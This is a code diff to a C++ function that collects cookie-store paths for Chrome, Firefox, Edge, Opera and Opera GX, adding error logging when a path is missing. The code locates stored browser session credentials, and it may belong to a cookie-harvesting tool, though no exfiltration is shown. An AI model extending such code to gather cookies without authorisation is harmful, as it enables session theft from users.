@@ -247,11 +247,17 @@ std::vector<std::wstring> GetCookiePaths() {
     if (!chromeCookiesPath.empty()) {
         cookiePaths.push_back(chromeCookiesPath);
     }
+    else {
+        std::wcerr << "Failed to retrieve Chrome cookies path." << std::endl;
+    }
 
     // Get the path of Firefox profiles and add it to the vector if it exists
     std::wstring firefoxProfilesPath = GetFirefoxProfilesPath();
     if (!firefoxProfilesPath.empty()) {
         cookiePaths.push_back(firefoxProfilesPath);
+    }
+    else {
+        std::wcerr << "Failed to retrieve Firefox profiles path." << std::endl;
     }
 
     // Get the path of Edge cookies and add it to the vector if it exists
@@ -259,17 +265,26 @@ std::vector<std::wstring> GetCookiePaths() {
     if (!edgeCookiesPath.empty()) {
         cookiePaths.push_back(edgeCookiesPath);
     }
+    else {
+        std::wcerr << "Failed to retrieve Edge cookies path." << std::endl;
+    }
 
     // Get the path of Opera Stable cookies and add it to the vector if it exists
     std::wstring operaStableCookiesPath = GetOperaStableCookiesPath();
     if (!operaStableCookiesPath.empty()) {
         cookiePaths.push_back(operaStableCookiesPath);
     }
+    else {
+        std::wcerr << "Failed to retrieve Opera Stable cookies path." << std::endl;
+    }
 
     // Get the path of Opera GX Stable cookies and add it to the vector if it exists
     std::wstring operaGXStableCookiesPath = GetOperaGXStableCookiesPath();
     if (!operaGXStableCookiesPath.empty()) {
         cookiePaths.push_back(operaGXStableCookiesPath);
+    }
+    else {
+        std::wcerr << "Failed to retrieve Opera GX Stable cookies path." << std::endl;
     }
 
     return cookiePaths;
